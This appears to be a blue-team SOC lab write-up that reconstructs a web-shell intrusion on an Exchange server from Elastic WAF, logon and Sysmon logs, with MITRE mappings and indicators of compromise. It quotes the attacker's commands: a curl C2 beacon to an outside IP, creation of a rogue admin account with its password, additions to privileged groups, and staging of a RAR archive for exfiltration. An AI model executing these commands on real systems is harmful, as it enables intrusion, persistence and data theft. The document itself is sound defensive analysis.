@@ -1,0 +1,407 @@
+---
+title: "Alert Investigation Walkthrough — SOC-20250720"
+category: "SOC INVESTIGATION"
+description: "Investigating a series of SIEM and EDR alerts triggered by suspicious web requests, web shell activity, and anomalous Administrator account behaviour on SomeCorp's infrastructure. Tracing the full attack chain through WAF logs, Windows Security Event logs, and Sysmon process creation events to reconstruct a confirmed compromise from initial access through data staging."
+thumbnail: "/dashboard-starting-point.png"
+date: "June 2025"
+classification: "Technical / Incident Investigation"
+challenge: "SOC Investigation"
+analyst: "Kamau James Kimani"
+tags:
+  [
+    "Web Shell",
+    "ProxyLogon",
+    "SIEM",
+    "SOC",
+    "Sysmon",
+    "Elastic",
+    "Process Creation",
+    "Privilege Escalation",
+    "Persistence",
+    "C2",
+    "Data Staging",
+    "Incident Response",
+    "Blue Team",
+    "MITRE ATT&CK",
+  ]
+status: "Completed"
+---
+
+## Executive Summary
+
+Investigated a series of High and Critical severity alerts triggered
+across SomeCorp's infrastructure on July 20, 2025. The investigation
+began with a WAF alert flagging automated POST requests to a known
+Exchange exploitation endpoint and escalated through web shell
+confirmation, host-based logon analysis, and Sysmon process creation
+pivoting. The full attack chain was reconstructed, from initial web
+shell access through C2 beaconing, rogue account creation, privilege
+escalation, discovery, and data staging and classified as a
+confirmed True Positive.
+
+<Callout type="key">
+  **KEY INSIGHT:** A single alert rarely tells the full story. This
+  investigation demonstrates how pivoting across multiple log sources: WAF logs,
+  Windows Security Event ID 4624, and Sysmon Event ID 1, is what separates
+  surface-level triage from a complete attack chain reconstruction. Each alert
+  was a breadcrumb; the chain only became visible when they were read together.
+</Callout>
+
+---
+
+## Investigation Approach
+
+I picked up three alerts in sequence: SOC-20250720-0012,
+SOC-20250720-0013, and SOC-20250720-0015. Each one appeared related,
+and my approach was to treat them as a single investigation thread
+rather than isolated events, validating each alert, then pivoting to
+the next layer of evidence.
+
+---
+
+## Phase 1: Suspicious Web Requests (Alert SOC-20250720-0012)
+
+The first alert was a High severity WAF flag on multiple POST requests
+from an external IP to SomeCorp's server. The key fields from the
+alert dropdown were:
+
+| Field           | Value                                                                            |
+| --------------- | -------------------------------------------------------------------------------- |
+| **Alert ID**    | SOC-20250720-0012                                                                |
+| **Severity**    | High                                                                             |
+| **Client IP**   | `203.0.113.55`                                                                   |
+| **Destination** | `winserv2019.some.corp`                                                          |
+| **Alert Time**  | Jul 20, 2025 @ 04:38 AM                                                          |
+| **Trigger**     | WAF — Multiple POST requests to `proxyLogon.ecp` (possible exploitation attempt) |
+
+The targeted endpoint: `proxyLogon.ecp`, is associated with the
+ProxyLogon vulnerability, a critical Microsoft Exchange flaw that
+allows unauthenticated remote code execution. This was enough to
+warrant a deeper look.
+
+### Building the Table in Elastic
+
+In Elastic Discover, I scoped the filter to
+`client.ip: 203.0.113.55` and `http.request.method: POST`, then added
+the following columns by clicking the `+` icon next to each field on
+the left panel:
+
+- `client.ip`
+- `user_agent`
+- `http.request.method`
+- `url.path`
+- `http.response.status_code`
+
+![building the table in elastic](/elastic-first-visualization-table.png)
+
+The results showed every POST request carrying a Python-based user
+agent string, confirming automated, scripted requests rather than
+human browser activity. The campaign started at **04:45:31**. This
+was not organic traffic; it was a deliberate, programmatic
+exploitation attempt.
+
+**Classification at this stage:** Suspicious and escalated to next
+alert for correlation.
+
+---
+
+## Phase 2 : Web Shell Activity Confirmed (Alert SOC-20250720-0013)
+
+Seven minutes after the first alert, a second WAF alert fired from
+the same IP:
+
+| Field           | Value                                                                          |
+| --------------- | ------------------------------------------------------------------------------ |
+| **Alert ID**    | SOC-20250720-0013                                                              |
+| **Severity**    | High                                                                           |
+| **Client IP**   | `203.0.113.55`                                                                 |
+| **Destination** | `winserv2019.some.corp`                                                        |
+| **Alert Time**  | Jul 20, 2025 @ 04:45 AM                                                        |
+| **Trigger**     | WAF — Multiple GET requests to `errorEE.aspx` including query parameter `cmd=` |
+
+The `cmd=` query parameter is a hallmark of web shell interaction. To
+understand why: ASPX files are server-side scripts processed by
+Microsoft's IIS web server. They are not meant to be directly
+accessible to external users. When an attacker successfully uploads a
+malicious ASPX file to a web server, it becomes a web shell.
+backdoor that accepts operating system commands via HTTP query
+parameters and returns the output in the HTTP response, giving the
+attacker remote code execution that is difficult to distinguish from
+legitimate web traffic.
+
+### Updated Elastic Filter
+
+I updated the query to target the specific file and method:
+
+```python
+http.request.method:GET and  url.path:errorEE.aspx
+```
+
+![image of  get method and errorEE filter one](/elastic-errorEE-filter.png)
+![image of  get method and errorEE filter one](/elastic-errorEE-filter2.png)
+
+The `url.path` field in the results revealed the actual commands the
+attacker was sending through the web shell. For instance I observed discovery commands
+consistent with post-exploitation reconnaissance. Crucially, every
+request returned **HTTP 200**, confirming that each command executed
+successfully on the server. The host was breached.
+
+> This activity maps directly to **MITRE ATT&CK T1505.003 — Server
+> Software Component: Web Shell**. The alert was escalated to L2 for
+> host-based investigation.
+
+---
+
+## Phase 3 : Pivoting to Host Evidence: The Administrator Logon
+
+With the web layer confirmed, I pivoted to host-based evidence to
+determine how far the attacker had moved. A concurrent EDR alert had
+flagged the `Administrator` account accessing the server outside
+business hours. The goal was to answer four questions:
+
+- **When** did the logon occur?
+- **How** did it occur? (Logon type)
+- **From where** did it originate?
+- Does it correlate with the web shell activity timeline?
+
+### Windows Security Event ID 4624
+
+I filtered for Event ID 4624 (successful logon) in Elastic, scoped
+to the Administrator account and the affected host, building a table
+with:
+
+- `winlog.event_id`
+- `host.name`
+- `winlog.event_data.TargetUserName`
+- `winlog.logon.type`
+- `winlog.event_data.IpAddress`
+
+![sysmon event id 1](/elastic-sysmon-event-1.png)
+
+The results confirmed a successful Administrator logon at
+**05:11:22**, outside business hours, with a source IP consistent
+with the attacker's activity, occurring directly after the web shell
+command execution window. The logon was confirmed malicious.
+
+### Pivoting to Sysmon Event ID 1
+
+Using the confirmed logon timestamp as an anchor, I extended the
+query to Sysmon process creation events:
+
+```Python
+@timestamp >= "2025-07-20T05:11:22" and winlog.event_id:1 and user.name:Administrator
+```
+
+Sysmon Event ID 1 captures the full command line, parent process, and
+file hash of every spawned process, making it far richer than the
+native Windows Event ID 4688, which truncates command lines and loses
+critical detail. The following fields were added to the table:
+
+- `user.name`
+- `process.parent.name`
+- `process.command_line`
+
+What followed was a complete reconstruction of the attacker's
+post-logon activity.
+
+---
+
+## Phase 4 : Attack Chain Reconstruction
+
+Reading the Sysmon events chronologically told a clear and damning
+story across eight distinct stages.
+
+**05:11:22 — Session Established.**
+`winlogon.exe` spawning `mpnotify.exe` confirmed the start of an
+interactive Administrator session. The attacker had successfully
+transitioned from web shell access to a full interactive session on
+the host.
+
+![session establishment](/elastic-session-establishment.png)
+
+**05:13:07–05:13:08 — C2 Beaconing.**
+The attacker immediately issued an outbound callback — twice — to
+confirm connectivity with their infrastructure:
+
+```python
+cmd.exe /c curl http://203.0.113.55/ping.php >> C:\Windows\Temp\beacon.log 2>&1
+```
+
+![c2 beacon ](/elastic-c2-beacon.png)
+
+The output was redirected to `beacon.log` in `C:\Windows\Temp`, a
+location chosen to blend in with legitimate temporary files. The
+repeated execution confirmed this was a connectivity check before
+proceeding. This maps to **T1071.001 — Application Layer Protocol:
+Web Protocols**.
+
+**05:13:09 — Rogue Account Created.**
+One second after the beacon confirmed connectivity:
+
+```python
+net user svc_backup PasswOrd123!/add/Domain
+```
+
+The name `svc_backup` was deliberately chosen to impersonate a
+legitimate service account. This maps to **T1136.002 — Create
+Account: Domain Account**.
+
+![rogue  account creation](/elastic-log-account-creation.png)
+
+**05:13:10–05:13:12 — Defense Evasion.**
+Before escalating privileges, the attacker probed the host's
+monitoring posture by querying `dsregcmd.exe`, `silcollector.cmd`, and
+the Software Inventory Logging registry key:
+
+```python
+reg.exe query hklm\software\microsoft\windows\softwareinventorylogging
+```
+
+![silcollector-invetory logging  tool](/elastic-silcollector.png)
+
+This was reconnaissance of the host's logging configuration
+checking whether subsequent actions would be captured. This maps to
+**T1562 — Impair Defenses**.
+
+**05:13:15–05:13:28 — Privilege Escalation.**
+In a rapid thirteen-second window, the attacker granted their new
+account maximum access:
+
+```python
+net localgroup "Server Operators" svc_backup /add     # 05:13:15
+net localgroup "Remote Desktop Users" svc_backup /add  # 05:13:22
+net localgroup Administrators svc_backup /add           # 05:13:28
+```
+
+![triple group addition](/elastic-tripple-account-creation.png)
+![triple group account addition](/elastic-triple-account-creation2.png)
+
+This triple-group addition is a textbook attacker pattern. Server
+Operators grants service modification rights (including on domain
+controllers). Remote Desktop Users guarantees persistent RDP access.
+Administrators grants full local control. Together, they create a
+fully weaponized account that survives even if the web shell is
+discovered and removed. This maps to **T1098.007 — Account
+Manipulation**.
+
+**05:14:05–05:15:55 — Attacker Pivots to New Account.**
+`svc_backup` became active, with `explorer.exe` and `powershell.exe`
+spawning under its context. The attacker had logged in interactively
+using their new account and was now operating independently of the
+compromised Administrator session.
+
+**05:15:55–05:16:14 — Discovery.**
+Operating as `svc_backup`, the attacker confirmed their access level:
+
+```python
+whoami.exe
+whoami.exe /priv
+net.exe localgroup Administrators
+net.exe group "Domain Admins" /domain
+```
+
+Notably, `net1.exe` was used alongside `net.exe` for the group
+queries; a subtle evasion technique, since many detection rules
+monitor `net.exe` but miss `net1.exe`, which executes identically.
+This maps to **T1069 — Permission Groups Discovery** and **T1033 —
+System Owner/User Discovery**.
+
+**05:17:55 — Data Staged for Exfiltration.**
+The final recorded action was the most significant:
+
+```python
+rar.exe a -hpSpring2025! -m5 C:\Temp\finance_it_archive.rar [source path]
+```
+
+A password-protected, maximum-compression archive named
+`finance_it_archive.rar` was staged in `C:\Temp`. The archive name was
+referencing finance data and the password protection strongly
+indicate preparation for exfiltration. This maps to **T1560.001 —
+Archive Collected Data: Archive via Utility**.
+
+---
+
+## Phase 5 : EDR Corroboration (Alert SOC-20250720-0015)
+
+Independent of the manual log investigation, the EDR platform
+generated a Critical alert at precisely **05:13:10**, one second
+after the `net user svc_backup` command executed:
+
+| Field            | Value                                                 |
+| ---------------- | ----------------------------------------------------- |
+| **Alert ID**     | SOC-20250720-0015                                     |
+| **Severity**     | Critical                                              |
+| **Account Used** | Administrator                                         |
+| **Hostname**     | winserv2019.some.corp                                 |
+| **Alert Time**   | Jul 20, 2025 @ 05:13:10                               |
+| **Trigger**      | EDR — User Account Management: A new user was created |
+
+This independent EDR corroboration confirmed the SIEM-based finding
+with a separate detection source, providing a formal Alert ID that
+ties directly into the evidentiary chain and strengthens the incident
+report for L2 handoff.
+
+---
+
+## MITRE ATT&CK Summary
+
+| Tactic               | Technique                                   | ID        | Evidence                                             |
+| -------------------- | ------------------------------------------- | --------- | ---------------------------------------------------- |
+| Initial Access       | Server Software Component: Web Shell        | T1505.003 | `errorEE.aspx`, `cmd=` parameter, HTTP 200           |
+| Command & Control    | Application Layer Protocol: Web Protocols   | T1071.001 | `curl` beacon to `203.0.113.55/ping.php`             |
+| Persistence          | Create Account: Domain Account              | T1136.002 | `net user svc_backup Passw0rd123! /add /domain`      |
+| Privilege Escalation | Account Manipulation                        | T1098.007 | Added to Administrators, Server Operators, RDP Users |
+| Defense Evasion      | Impair Defenses                             | T1562     | Software inventory logging registry query            |
+| Discovery            | Permission Groups Discovery                 | T1069     | `net localgroup`, `net group "Domain Admins"`        |
+| Discovery            | System Owner/User Discovery                 | T1033     | `whoami`, `whoami /priv`                             |
+| Collection           | Archive Collected Data: Archive via Utility | T1560.001 | `rar.exe -hpSpring2025! finance_it_archive.rar`      |
+
+---
+
+## Key IOCs
+
+| Type             | Value                            | Context                              |
+| ---------------- | -------------------------------- | ------------------------------------ |
+| IP Address       | `203.0.113.55`                   | Attacker source IP / C2 server       |
+| URL              | `/errorEE.aspx?cmd=`             | Web shell endpoint                   |
+| File             | `C:\Windows\Temp\beacon.log`     | C2 beacon output log                 |
+| File             | `C:\Temp\finance_it_archive.rar` | Staged exfiltration archive          |
+| Account          | `svc_backup`                     | Attacker-created persistence account |
+| Credential       | `Passw0rd123!`                   | `svc_backup` account password        |
+| Archive Password | `Spring2025!`                    | RAR archive encryption password      |
+
+---
+
+## Classification & Recommendation
+
+**Classification:** True Positive, Confirmed Compromise
+
+The activity represents a complete, multi-stage intrusion: from
+automated exploitation of a known Exchange vulnerability, through web
+shell deployment, interactive host access, account creation, privilege
+escalation, and data staging. Every indicator was corroborated across
+at least two independent log sources.
+
+**Outstanding Items:**
+
+- Confirm whether `finance_it_archive.rar` was exfiltrated one need to review
+  outbound traffic to `203.0.113.55` after 05:17:55
+- Determine if `svc_backup` was used to access additional hosts
+  (lateral movement check)
+- Identify and patch the root cause vulnerability that allowed web
+  shell upload
+- Engage legal/DPO team to assess whether the archived finance data
+  constitutes a reportable breach
+- Block `203.0.113.55` org-wide and submit to threat intel platform
+
+**Detection Tuning Recommendation:**
+
+The `net user /add` command followed immediately by multiple
+`net localgroup` additions within a short window is a high-fidelity,
+low-noise signal for malicious account creation and weaponization. A
+detection rule combining these two patterns, particularly when
+executed outside business hours under a privileged account would
+have generated an earlier alert before privilege escalation completed.
+Additionally, detection rules should account for `net1.exe`
+invocations alongside `net.exe`, as the two are functionally identical
+but `net1` is commonly missed by rules that only monitor the former.
